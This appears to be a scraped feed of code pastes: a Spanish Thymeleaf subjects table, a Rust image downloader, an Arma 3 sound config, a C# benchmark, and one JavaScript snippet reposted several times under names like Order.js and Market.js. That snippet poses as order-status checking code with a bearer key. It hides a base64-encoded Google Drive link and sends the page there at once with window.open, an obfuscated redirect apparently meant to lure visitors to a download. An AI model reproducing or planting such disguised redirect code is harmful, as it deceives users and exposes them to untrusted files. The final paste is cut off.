+    <a href=""/subjectNew"" class=""btn btn-success mb-3"">Agregar Nueva Materia</a>
+
+    <table class=""table table-bordered"">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Nombre</th>
+                <th>Código</th>
+                <th>Acciones</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr th:each=""materia : ${subject}"">
+                <td th:text=""${materia.id}""></td>
+                <td th:text=""${materia.materia}""></td>
+                <td th:text=""${materia.descripcion}""></td>
+                <td>
+                    <a th:href=""@{/editSubject/{id}(id=${materia.id})}"" class=""btn btn-warning btn-sm"">Editar</a>
+                    <a th:href=""@{/deleteSubject/{id}(id=${materia.id})}"" class=""btn btn-danger btn-sm""
+                       onclick=""return confirm('¿Estás seguro de eliminar esta materia?')"">Eliminar</a>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+</body>
+</html>"
+h4fjJ8Ru,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 08:14:41 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/97085/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+p2cJF3tN,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 07:58:56 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/06812/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+EvU93nTj,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 07:43:33 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/23436/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+4c9mCLXS,Products.js,dentira,JavaScript,Sunday 6th of April 2025 07:27:45 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/39969/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+WcDzd0ay,Tokio Rust Concurrency Attempt,MetonymyQT,Rust,Sunday 6th of April 2025 07:26:26 AM CDT,"use std::ops::Deref;
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::thread;
+use std::time::Duration;
+use anyhow::{anyhow, Result};
+use signal_hook::consts::{SIGINT, SIGTERM};
+use tokio::fs::File;
+use tokio::io::AsyncWriteExt;
+use tokio::sync::mpsc;
+use tokio::sync::oneshot;
+use tokio::sync::mpsc::Sender;
+use tokio::task::JoinHandle;
+use signal_hook::iterator::Signals;
+use log::{debug, error, info};
+use tokio::time::{sleep, timeout};
+
+fn setup_graceful_shutdown(cancelled: Arc<AtomicBool>) {
+    thread::spawn(move || {
+        let signals = Signals::new([SIGINT, SIGTERM]);
+        match signals {
+            Ok(mut signal_info) => {
+                if signal_info.forever().next().is_some() {
+                    info!(""user request cancellation"");
+                    cancelled.store(true, Ordering::Relaxed);
+                }
+            }
+            Err(error) => {
+                error!(""Failed to setup signal handler: {error}"")
+            }
+        }
+    });
+}
+
+async fn download_image(tx: Sender<Result<bytes::Bytes, anyhow::Error>>, url: &str) {
+    info!(""Downloading image for {}"", url);
+    let resp = reqwest::get(url)
+        .await;
+    if let Ok(resp) = resp {
+        let image_bytes = resp.bytes().await;
+        match image_bytes {
+            Ok(data) => {
+                tx.send(Ok(data)).await.expect(""failed to send message"");
+            }
+            Err(err) => {
+                tx.send(Err(anyhow!(""failed to get image data: {}"", err))).await.expect(""failed to send message"");
+            }
+        }
+    } else {
+        tx.send(Err(anyhow!(""failed to get response""))).await.expect(""failed to send message"");
+    }
+}
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    env_logger::init();
+
+    let task_timeout = Duration::from_millis(500);
+
+    let (tx, mut rx) = mpsc::channel(32);
+    let cancelled = Arc::from(AtomicBool::new(false));
+    setup_graceful_shutdown(cancelled.clone());
+
+    let urls: Vec<&str> = vec![
+        ""https://images.unsplash.com/photo-1739117956532-8a37c76093dd?fm=jpg"",
+        ""https://images.unsplash.com/photo-1735930371721-d1243e8122ab?fm=jpg"",
+        ""https://images.unsplash.com/photo-1732204662871-f853329ce638?fm=jpg"",
+        ""https://images.unsplash.com/photo-1712677925320-5f93d7f853f5?fm=jpg"",
+        ""https://images.unsplash.com/photo-1712677925900-12574cb3cf15?fm=jpg"",
+        ""https://images.unsplash.com/photo-1710436000845-bb707af976a6?fm=jpg"",
+        ""https://images.unsplash.com/photo-1700386277812-5ff74eb03650?fm=jpg"",
+        ""https://images.unsplash.com/photo-1700386277415-c9c5270ee8b8?fm=jpg"",
+        ""https://images.unsplash.com/photo-1691947563165-28011f40d786?fm=jpg"",
+        ""https://images.unsplash.com/photo-1691782359338-97fcbcce8ce8?fm=jpg""
+    ];
+
+    let mut handles: Vec<JoinHandle<()>> = Vec::new();
+    for url in urls {
+        let tx = tx.clone();
+        let handle = tokio::spawn(async move {
+            let timeout_status = timeout(task_timeout, download_image(tx, url)).await;
+            debug!(""timeout status = {:?} for url {}"", timeout_status, url)
+        });
+        handles.push(handle);
+    }
+
+
+    let wait_cancelled = cancelled.clone();
+    let wait_task = tokio::spawn(async move {
+       for handle in handles {
+           if wait_cancelled.load(Ordering::Relaxed) {
+               handle.abort();
+           } else {
+               let _ = handle.await;
+           }
+       }
+        drop(tx);
+    });
+
+    let mut counter = 1;
+    while let Some(message) = rx.recv().await {
+        if cancelled.load(Ordering::Relaxed) {
+            break
+        }
+
+        if let Ok(image_bytes) = message {
+            let file = File::create(format!(""{}.jpg"", counter)).await;
+            if let Ok(mut file) = file {
+                let _ = file.write_all(&image_bytes).await;
+                info!(""Wrote image {}"", counter);
+            } else {
+                error!(""Failed to write image {}"", counter)
+            }
+
+            counter += 1;
+        }
+    }
+
+    let _ = wait_task.await;
+    Ok(())
+}"
+Qrt31gWX,Order.js,dentira,JavaScript,Sunday 6th of April 2025 07:12:22 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/66884/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+6YjkVe7W,Unit Movement Sounds won't Work On Tanoa Surfaces due missing this sounds,Traggered,C++,Sunday 6th of April 2025 07:09:52 AM CDT,"
+	
+	{
+		""adjust_stand_side"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side1"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_stand_side"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side2"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_stand_side"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side3"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_stand_to_kneel"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_kneel1"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_stand_to_kneel"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_kneel2"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_kneel_to_stand"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_kneel_to_stand1"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_kneel_to_stand"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_kneel_to_stand2"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_stand_to_prone"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_prone"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_prone_to_stand"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_prone_to_stand"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_prone_up"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_prone_up"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_prone_up_back"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_prone_up_back"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_prone_down"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side1"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_prone_down"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side2"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_prone_down"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side3"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_prone_left"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_prone_left"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_prone_right"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_prone_right"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_kneel_to_prone"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_kneel_to_prone"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_prone_to_kneel"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_prone_to_kneel"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_stand_to_left_prone"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_left_prone"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_stand_to_right_prone"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_right_prone"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_left_prone_to_stand"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_left_prone_to_stand"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""adjust_right_prone_to_stand"",
+		
+		{
+			""\A3\sounds_f\characters\stances\concrete_adjust_right_prone_to_stand"",
+			0.25118864,
+			1,
+			20
+		}
+	},
+	
+	{
+		""roll"",
+		
+		{
+			""A3\Sounds_F\characters\movements\roll\concrete_roll_1"",
+			0.89125091,
+			1,
+			20
+		}
+	},
+	
+	{
+		""roll"",
+		
+		{
+			""A3\Sounds_F\characters\movements\roll\concrete_roll_2"",
+			0.89125091,
+			1,
+			20
+		}
+	},
+	
+	{
+		""roll"",
+		
+		{
+			""A3\Sounds_F\characters\movements\roll\concrete_roll_3"",
+			0.89125091,
+			1,
+			20
+		}
+	},
+	
+	{
+		""roll_unarmed"",
+		
+		{
+			""A3\Sounds_F\characters\movements\roll\unarmed_concrete_roll_1"",
+			0.89125091,
+			1,
+			20
+		}
+	},
+	
+	{
+		""roll_unarmed"",
+		
+		{
+			""A3\Sounds_F\characters\movements\roll\unarmed_concrete_roll_2"",
+			0.89125091,
+			1,
+			20
+		}
+	},
+	
+	{
+		""roll_unarmed"",
+		
+		{
+			""A3\Sounds_F\characters\movements\roll\unarmed_concrete_roll_3"",
+			0.89125091,
+			1,
+			20
+		}
+	},
+	
+	{
+		""laydown"",
+		
+		{
+			""\A3\Sounds_F\characters\movements\laydown\concrete_laydown_1"",
+			0.50118721,
+			1,
+			20
+		}
+	},
+	
+	{
+		""laydown"",
+		
+		{
+			""\A3\Sounds_F\characters\movements\laydown\concrete_laydown_2"",
+			0.50118721,
+			1,
+			20
+		}
+	},
+	
+	{
+		""bodyfall"",
+		
+		{
+			""\A3\sounds_f\characters\movements\bodyfalls\bodyfall_concrete_1"",
+			0.50118721,
+			1,
+			20
+		}
+	},
+	
+	{
+		""bodyfall"",
+		
+		{
+			""\A3\sounds_f\characters\movements\bodyfalls\bodyfall_concrete_2"",
+			0.50118721,
+			1,
+			20
+		}
+	},
+	
+	{
+		""bodyfall"",
+		
+		{
+			""\A3\sounds_f\characters\movements\bodyfalls\bodyfall_concrete_3"",
+			0.50118721,
+			1,
+			20
+		}
+	},
+	
+	{
+		""swim"",
+		
+		{
+			""soundset"",
+			""movement_swim_SoundSet""
+		}
+	},
+	
+	{
+		""Acts_carFixingWheel"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_carFixingWheel"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_PercMwlkSlowWrflDf"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_PercMwlkSlowWrflDf"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_PercMwlkSlowWrflDf2"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_PercMwlkSlowWrflDf2"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_SittingJumpingSaluting_out"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_SittingJumpingSaluting_out"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WalkingChecking"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WalkingChecking"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_CrouchingFiringLeftRifle02"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_CrouchingFiringLeftRifle02"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_CrouchingFiringLeftRifle03"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_CrouchingFiringLeftRifle03"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_CrouchingFiringLeftRifle04"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_CrouchingFiringLeftRifle04"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_HUBABriefing"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_HUBABriefing"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_PointingLeftUnarmed"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_PointingLeftUnarmed"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_SittingJumpingSaluting_in"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_SittingJumpingSaluting_in"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_StandingSpeakingUnarmed"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_StandingSpeakingUnarmed"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_TreatingWounded_in"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_TreatingWounded_in"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_TreatingWounded_out"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_TreatingWounded_out"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_UnconsciousStandUp_part1"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_UnconsciousStandUp_part1"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_AIWalk"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_AIWalk_1"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_1"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_AIWalk_1b"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_1b"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_AIWalk_2"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_2"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_AIWalk_3"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_3"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_AIWalk_4"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_4"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_AIWalk_5"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_5"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_AIWalk_6"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_6"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_PlayerWalk_1"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_1"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_PlayerWalk_2"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_2"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_PlayerWalk_3"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_3"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_PlayerWalk_4"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_4"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_PlayerWalk_5"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_5"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB01_PlayerWalk_6"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_6"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB02_AIWalk"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB02_AIWalk_2"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_2"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB02_AIWalk_3"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_3"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB02_AIWalk_4"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_4"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB02_AIWalk_5"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_5"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB02_AIWalk_6"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_6"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB02_PlayerWalk_1"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_PlayerWalk_1"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB02_PlayerWalk_2"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_PlayerWalk_2"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""Acts_WelcomeOnHUB02_PlayerWalk_3"",
+		
+		{
+			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_PlayerWalk_3"",
+			0.56234133,
+			1,
+			20
+		}
+	},
+	
+	{
+		""AmovPercMstpSnonWnonDnon_exercisePushup"",
+		
+		{
+			""\A3\Sounds_F\characters\cutscenes\concrete_AmovPercMstpSnonWnonDnon_exercisePushup"",
+			0.56234133,
+			1,
+			20
+		}
+	}"
+dtBvwzWh,ParamsBenchmark,mquinlan,C#,Sunday 6th of April 2025 07:08:39 AM CDT,"using BenchmarkDotNet.Attributes;
+using BenchmarkDotNet.Running;
+
+namespace ParamsBench;
+
+public class Program
+{
+    [Benchmark]
+    public long ParamsArrayTest() 
+        => ParamsArray(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40);
+    
+    [Benchmark]
+    public long ParamsROSpanTest() 
+        => ParamsROSpan(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40);
+    
+    [Benchmark]
+    public long ParamsIEnumerableTest() 
+        => ParamsIEnumerable(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40);
+    
+    private static long ParamsArray(params int[] values)
+    {
+        var result = 0L;
+        foreach (var value in values) result += (long)value * 10;
+        return result;
+    }
+
+    private static long ParamsROSpan(params ReadOnlySpan<int> values)
+    {
+        var result = 0L;
+        foreach (var value in values) result += (long)value * 10;
+        return result;
+    }
+
+    private static long ParamsIEnumerable(params IEnumerable<int> values)
+    {
+        var result = 0L;
+        foreach (var value in values) result += (long)value * 10;
+        return result;
+    }
+
+    private static void Main()
+    {
+        _ = BenchmarkRunner.Run<Program>();    
+    }
+}"
+G9N0PXgx,Market.js,dentira,JavaScript,Sunday 6th of April 2025 06:56:45 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/98689/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+3H4XvS4n,Untitled,dentira,JavaScript,Sunday 6th of April 2025 06:41:22 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/66933/status"";
